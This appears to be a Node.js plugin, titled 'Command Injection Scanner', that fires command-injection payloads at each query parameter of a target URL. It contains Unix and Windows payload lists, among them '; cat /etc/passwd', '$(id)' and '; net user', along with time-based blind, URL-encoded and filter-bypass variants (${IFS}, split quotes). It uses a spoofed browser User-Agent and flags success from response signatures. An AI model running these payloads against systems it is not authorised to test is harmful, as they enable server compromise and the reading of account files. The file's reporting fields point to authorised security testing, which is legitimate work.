const axios = require('axios');
const { exec } = require('child_process');
const util = require('util');

class CommandInjectionExploit {
    constructor() {
        this.displayName = 'Command Injection Scanner';
        this.description = 'Command injection vulnerability detection and exploitation';
        this.severity = 'critical';
        this.category = 'web-application';
        this.version = '2.0.0';

        // Command injection payloads for different operating systems
        this.payloads = {
            // Unix/Linux command injection
            unix: [
                '; id',
                '| id',
                '& id',
                '&& id',
                '|| id',
                '`id`',
                '$(id)',
                '; whoami',
                '| whoami',
                '& whoami',
                '&& whoami',
                '|| whoami',
                '`whoami`',
                '$(whoami)',
                '; uname -a',
                '| uname -a',
                '&& uname -a',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '&& cat /etc/passwd',
                '; ls -la',
                '| ls -la',
                '&& ls -la',
                '; pwd',
                '| pwd',
                '&& pwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                '; ps aux',
                '| ps aux',
                '&& ps aux'
            ],

            // Windows command injection
            windows: [
                '& dir',
                '&& dir',
                '| dir',
                '|| dir',
                '; dir',
                '& whoami',
                '&& whoami',
                '| whoami',
                '|| whoami',
                '; whoami',
                '& ver',
                '&& ver',
                '| ver',
                '|| ver',
                '; ver',
                '& ipconfig',
                '&& ipconfig',
                '| ipconfig',
                '|| ipconfig',
                '; ipconfig',
                '& type C:\\Windows\\win.ini',
                '&& type C:\\Windows\\win.ini',
                '| type C:\\Windows\\win.ini',
                '; net user',
                '&& net user',
                '| net user'
            ],

            // Time-based blind command injection
            timeBased: [
                '; sleep 5',
                '| sleep 5',
                '&& sleep 5',
                '`sleep 5`',
                '$(sleep 5)',
                '; ping -c 5 127.0.0.1',
                '| ping -c 5 127.0.0.1',
                '&& ping -c 5 127.0.0.1',
                '; timeout 5',
                '&& timeout 5',
                '| timeout 5',
                '; ping -n 5 127.0.0.1',
                '&& ping -n 5 127.0.0.1',
                '| ping -n 5 127.0.0.1'
            ],

            // Output redirection and file operations
            fileOperations: [
                '; echo "test" > /tmp/cmdtest.txt',
                '&& echo "test" > /tmp/cmdtest.txt',
                '| echo "test" > /tmp/cmdtest.txt',
                '; touch /tmp/cmdtest.txt',
                '&& touch /tmp/cmdtest.txt',
                '| touch /tmp/cmdtest.txt',
                '; echo "test" > C:\\temp\\cmdtest.txt',
                '&& echo "test" > C:\\temp\\cmdtest.txt',
                '| echo "test" > C:\\temp\\cmdtest.txt'
            ],

            // Special characters and encoding
            encoded: [
                '%3B%20id',
                '%7C%20id',
                '%26%20id',
                '%26%26%20id',
                '%7C%7C%20id',
                '%60id%60',
                '%24%28id%29',
                '%3B%20whoami',
                '%7C%20whoami',
                '%26%20whoami',
                '%26%26%20whoami',
                '%7C%7C%20whoami'
            ],

            // Filter bypass techniques
            bypass: [
                '${IFS}id',
                '${IFS}whoami',
                'i\\d',
                'w\\h\\o\\a\\m\\i',
                'id#comment',
                'whoami#comment',
                'id/*comment*/',
                'whoami/*comment*/',
                'i""d',
                'who""ami',
                "i''d",
                "who''ami"
            ]
        };

        // Command execution signatures for validation
        this.commandSignatures = {
            'id': [
                /uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)/,
                /uid=\d+/,
                /gid=\d+/
            ],
            'whoami': [
                /^[a-zA-Z0-9_-]+$/,
                /root/,
                /administrator/,
                /system/
            ],
            'uname': [
                /Linux/i,
                /Darwin/i,
                /GNU/i,
                /kernel/i
            ],
            'ver': [
                /Microsoft Windows/i,
                /Version \d+\.\d+/i,
                /\[Version \d+\.\d+\.\d+\]/i
            ],
            'dir': [
                /Directory of /i,
                /\d+\/\d+\/\d+\s+\d+:\d+/,
                /<DIR>/i
            ],
            'ipconfig': [
                /IP Configuration/i,
                /IPv4 Address/i,
                /Subnet Mask/i,
                /Default Gateway/i
            ],
            'ps': [
                /PID\s+TTY/,
                /\s+\d+\s+/,
                /root\s+\d+/
            ],
            'cat /etc/passwd': [
                /root:.*:0:0:/,
                /bin:.*:1:1:/,
                /^[^:]+:[^:]*:\d+:\d+:/
            ]
        };

        // Common vulnerable parameters
        this.vulnerableParameters = [
            'cmd',
            'command',
            'exec',
            'execute',
            'system',
            'shell',
            'run',
            'ping',
            'host',
            'ip',
            'domain',
            'file',
            'path',
            'url',
            'data',
            'input'
        ];
    }

    async execute(target, options = {}) {
        try {
            const startTime = Date.now();
            const results = {
                target,
                timestamp: new Date(),
                vulnerabilities: [],
                statistics: {
                    totalTests: 0,
                    commandExecutions: 0,
                    timeBasedDetections: 0,
                    outputBasedDetections: 0,
                    bypassTechniques: 0
                },
                detailedResults: {}
            };

            console.log(`[CmdInject] Starting command injection scan on: ${target}`);

            // Parse target and identify testable parameters
            const targetInfo = this.parseTarget(target);

            if (!targetInfo.parameters || targetInfo.parameters.length === 0) {
                throw new Error('No testable parameters found in target URL');
            }

            console.log(`[CmdInject] Found ${targetInfo.parameters.length} testable parameters`);

            // Test each parameter with different injection techniques
            for (const param of targetInfo.parameters) {
                console.log(`[CmdInject] Testing parameter: ${param.name}`);

                // Output-based command injection testing
                const outputResults = await this.testOutputBasedInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_output`] = outputResults;
                results.statistics.totalTests += outputResults.tests.length;
                results.statistics.outputBasedDetections += outputResults.vulnerabilities.length;
                results.vulnerabilities.push(...outputResults.vulnerabilities);

                // Time-based blind command injection testing
                const timeResults = await this.testTimeBasedInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_time`] = timeResults;
                results.statistics.totalTests += timeResults.tests.length;
                results.statistics.timeBasedDetections += timeResults.vulnerabilities.length;
                results.vulnerabilities.push(...timeResults.vulnerabilities);

                // Encoded payload testing
                const encodedResults = await this.testEncodedInjection(targetInfo, param, options);
                results.detailedResults[`${param.name}_encoded`] = encodedResults;
                results.statistics.totalTests += encodedResults.tests.length;
                results.vulnerabilities.push(...encodedResults.vulnerabilities);

                // Filter bypass testing
                const bypassResults = await this.testFilterBypass(targetInfo, param, options);
                results.detailedResults[`${param.name}_bypass`] = bypassResults;
                results.statistics.totalTests += bypassResults.tests.length;
                results.statistics.bypassTechniques += bypassResults.vulnerabilities.length;
                results.vulnerabilities.push(...bypassResults.vulnerabilities);
            }

            results.statistics.commandExecutions = results.vulnerabilities.length;
            results.executionTime = Date.now() - startTime;

            console.log(`[CmdInject] Scan completed. Found ${results.vulnerabilities.length} vulnerabilities in ${results.executionTime}ms`);

            return results;

        } catch (error) {
            console.error('[CmdInject] Scan failed:', error.message);
            throw error;
        }
    }

    parseTarget(target) {
        try {
            const url = new URL(target);
            const parameters = [];

            // Extract URL parameters
            for (const [name, value] of url.searchParams.entries()) {
                parameters.push({
                    name,
                    value,
                    type: 'url',
                    location: 'query',
                    suspicious: this.vulnerableParameters.includes(name.toLowerCase())
                });
            }

            return {
                protocol: url.protocol,
                host: url.host,
                pathname: url.pathname,
                search: url.search,
                parameters,
                baseUrl: `${url.protocol}//${url.host}${url.pathname}`
            };
        } catch (error) {
            throw new Error(`Invalid target URL: ${error.message}`);
        }
    }

    async testOutputBasedInjection(targetInfo, param, options) {
        const results = {
            type: 'output_based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CmdInject] Testing output-based injection on parameter: ${param.name}`);

        // Test Unix/Linux payloads
        for (const payload of this.payloads.unix) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    platform: 'unix',
                    url: testUrl,
                    statusCode: response.status,
                    responseLength: response.data ? response.data.length : 0,
                    commandExecuted: this.detectCommandExecution(response.data, payload),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.commandExecuted) {
                    const vulnerability = {
                        type: 'Command Injection',
                        subtype: 'Output-based (Unix/Linux)',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        evidence: this.extractCommandEvidence(response.data, payload),
                        impact: 'Complete server compromise through arbitrary command execution',
                        recommendation: 'Use input validation, parameterized commands, and avoid system() calls',
                        cwe: 'CWE-78',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[CmdInject] Command execution detected: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    platform: 'unix',
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        // Test Windows payloads
        for (const payload of this.payloads.windows) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    platform: 'windows',
                    url: testUrl,
                    statusCode: response.status,
                    responseLength: response.data ? response.data.length : 0,
                    commandExecuted: this.detectCommandExecution(response.data, payload),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.commandExecuted) {
                    const vulnerability = {
                        type: 'Command Injection',
                        subtype: 'Output-based (Windows)',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        evidence: this.extractCommandEvidence(response.data, payload),
                        impact: 'Complete server compromise through arbitrary command execution',
                        recommendation: 'Use input validation, parameterized commands, and avoid cmd.exe calls',
                        cwe: 'CWE-78',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[CmdInject] Command execution detected: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    platform: 'windows',
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testTimeBasedInjection(targetInfo, param, options) {
        const results = {
            type: 'time_based',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CmdInject] Testing time-based injection on parameter: ${param.name}`);

        // Establish baseline response time
        const baselineUrl = this.buildTestUrl(targetInfo, param.name, param.value);
        const baselineTimes = [];

        for (let i = 0; i < 3; i++) {
            try {
                const start = Date.now();
                await this.makeRequest(baselineUrl, options);
                baselineTimes.push(Date.now() - start);
            } catch (error) {
                // Continue with other baseline tests
            }
        }

        const averageBaseline = baselineTimes.length > 0 ?
            baselineTimes.reduce((a, b) => a + b) / baselineTimes.length : 1000;

        for (const payload of this.payloads.timeBased) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const startTime = Date.now();

                const response = await this.makeRequest(testUrl, options);
                const responseTime = Date.now() - startTime;

                const testResult = {
                    payload,
                    url: testUrl,
                    responseTime,
                    baselineTime: averageBaseline,
                    timeDifference: responseTime - averageBaseline,
                    statusCode: response.status,
                    delayDetected: responseTime > averageBaseline + 4000, // 4+ second delay
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.delayDetected) {
                    const vulnerability = {
                        type: 'Command Injection',
                        subtype: 'Time-based Blind',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        evidence: `Response time: ${responseTime}ms (baseline: ${averageBaseline}ms)`,
                        impact: 'Blind command execution confirmed through timing analysis',
                        recommendation: 'Implement strict input validation and avoid executing user input',
                        cwe: 'CWE-78',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[CmdInject] Time-based injection detected: ${payload} (${responseTime}ms delay)`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testEncodedInjection(targetInfo, param, options) {
        const results = {
            type: 'encoded_injection',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CmdInject] Testing encoded injection on parameter: ${param.name}`);

        for (const payload of this.payloads.encoded) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    url: testUrl,
                    statusCode: response.status,
                    responseLength: response.data ? response.data.length : 0,
                    commandExecuted: this.detectCommandExecution(response.data, decodeURIComponent(payload)),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.commandExecuted) {
                    const vulnerability = {
                        type: 'Command Injection',
                        subtype: 'URL Encoded',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        decodedPayload: decodeURIComponent(payload),
                        evidence: this.extractCommandEvidence(response.data, decodeURIComponent(payload)),
                        impact: 'Filter bypass through encoding allows command execution',
                        recommendation: 'Implement comprehensive input validation that handles encoded input',
                        cwe: 'CWE-78',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[CmdInject] Encoded injection successful: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    async testFilterBypass(targetInfo, param, options) {
        const results = {
            type: 'filter_bypass',
            parameter: param.name,
            tests: [],
            vulnerabilities: []
        };

        console.log(`[CmdInject] Testing filter bypass on parameter: ${param.name}`);

        for (const payload of this.payloads.bypass) {
            try {
                const testUrl = this.buildTestUrl(targetInfo, param.name, payload);
                const response = await this.makeRequest(testUrl, options);

                const testResult = {
                    payload,
                    url: testUrl,
                    statusCode: response.status,
                    responseLength: response.data ? response.data.length : 0,
                    commandExecuted: this.detectCommandExecution(response.data, payload),
                    timestamp: new Date()
                };

                results.tests.push(testResult);

                if (testResult.commandExecuted) {
                    const vulnerability = {
                        type: 'Command Injection',
                        subtype: 'Filter Bypass',
                        severity: 'critical',
                        parameter: param.name,
                        payload,
                        evidence: this.extractCommandEvidence(response.data, payload),
                        impact: 'Security filter bypass allows command execution',
                        recommendation: 'Implement robust filtering that cannot be bypassed with obfuscation',
                        cwe: 'CWE-78',
                        owasp: 'A03:2021 – Injection'
                    };
                    results.vulnerabilities.push(vulnerability);
                    console.log(`[CmdInject] Filter bypass successful: ${payload}`);
                }

            } catch (error) {
                results.tests.push({
                    payload,
                    error: error.message,
                    timestamp: new Date()
                });
            }

            if (options.delay) {
                await this.sleep(options.delay);
            }
        }

        return results;
    }

    buildTestUrl(targetInfo, paramName, payload) {
        const url = new URL(targetInfo.baseUrl);

        // Set original parameters
        for (const param of targetInfo.parameters) {
            if (param.name === paramName) {
                url.searchParams.set(param.name, payload);
            } else {
                url.searchParams.set(param.name, param.value);
            }
        }

        return url.toString();
    }

    async makeRequest(url, options = {}) {
        const requestOptions = {
            method: 'GET',
            url,
            timeout: options.timeout || 30000,
            headers: {
                'User-Agent': options.userAgent || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                ...options.headers
            },
            validateStatus: () => true // Accept all status codes
        };

        return await axios(requestOptions);
    }

    detectCommandExecution(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return false;
        }

        // Extract command from payload
        const command = this.extractCommand(payload);
        if (!command) return false;

        // Check for command-specific signatures
        const signatures = this.commandSignatures[command];
        if (signatures) {
            return signatures.some(signature => signature.test(responseData));
        }

        // Generic command execution indicators
        const genericIndicators = [
            // Unix/Linux indicators
            /uid=\d+/,
            /gid=\d+/,
            /Linux/i,
            /GNU/i,
            /root:/,
            /bin:/,
            /usr:/,
            /var:/,
            /etc:/,

            // Windows indicators
            /Microsoft Windows/i,
            /Version \d+\.\d+/i,
            /Directory of /i,
            /Volume in drive/i,
            /C:\\>/,
            /<DIR>/i,

            // General command output
            /\$\s+/,
            /C:\\[^>]*>/,
            /[a-zA-Z]:\\/,
            /total \d+/,
            /drwx/,
            /-rw-/
        ];

        return genericIndicators.some(indicator => indicator.test(responseData));
    }

    extractCommand(payload) {
        // Remove command injection characters and extract the actual command
        const cleanPayload = payload.replace(/^[;&|`$()]+\s*/, '');
        const commandMatch = cleanPayload.match(/^(\w+)/);
        return commandMatch ? commandMatch[1] : null;
    }

    extractCommandEvidence(responseData, payload) {
        if (!responseData || typeof responseData !== 'string') {
            return 'No response data';
        }

        // Return first 300 characters as evidence
        let evidence = responseData.substring(0, 300);

        // Look for specific command execution indicators
        const command = this.extractCommand(payload);
        if (command && this.commandSignatures[command]) {
            for (const signature of this.commandSignatures[command]) {
                const match = responseData.match(signature);
                if (match) {
                    evidence += ` | Command signature found: ${match[0]}`;
                    break;
                }
            }
        }

        return evidence;
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async getInfo() {
        return {
            name: this.displayName,
            description: this.description,
            version: this.version,
            severity: this.severity,
            category: this.category,
            techniques: [
                'Output-based Command Injection',
                'Time-based Blind Command Injection',
                'URL Encoded Command Injection',
                'Filter Bypass Techniques'
            ],
            platforms: [
                'Unix/Linux',
                'Windows',
                'Cross-platform'
            ],
            parameters: [
                {
                    name: 'delay',
                    description: 'Delay between requests in milliseconds',
                    type: 'number',
                    default: 100
                },
                {
                    name: 'timeout',
                    description: 'Request timeout in milliseconds',
                    type: 'number',
                    default: 30000
                },
                {
                    name: 'userAgent',
                    description: 'Custom User-Agent header',
                    type: 'string',
                    default: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            ],
            payloadCount: Object.values(this.payloads).reduce((total, arr) => total + arr.length, 0),
            commandSignatures: Object.keys(this.commandSignatures).length,
            vulnerableParameters: this.vulnerableParameters.length
        };
    }
}

module.exports = CommandInjectionExploit;
